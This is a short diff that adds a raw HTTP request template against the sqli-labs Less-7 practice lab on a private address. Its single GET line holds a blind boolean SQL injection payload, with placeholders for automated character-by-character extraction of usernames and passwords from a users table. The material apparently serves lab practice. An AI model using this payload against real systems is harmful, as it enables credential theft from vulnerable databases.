@@ -1,0 +1,6 @@
+GET /sqli-labs/Less-7/?id=1%27%20and%20{BFP}{OPE}ascii(substring((select%20concat(username%2C'%3A'%2Cpassword)%20from%20users%20limit%202,1),{INC_1},1))%20and%20%27a%27=%27a HTTP/1.1
+User-Agent: python-requests/2.24.0
+Accept: */*
+Connection: close
+Host: 192.168.255.129
+
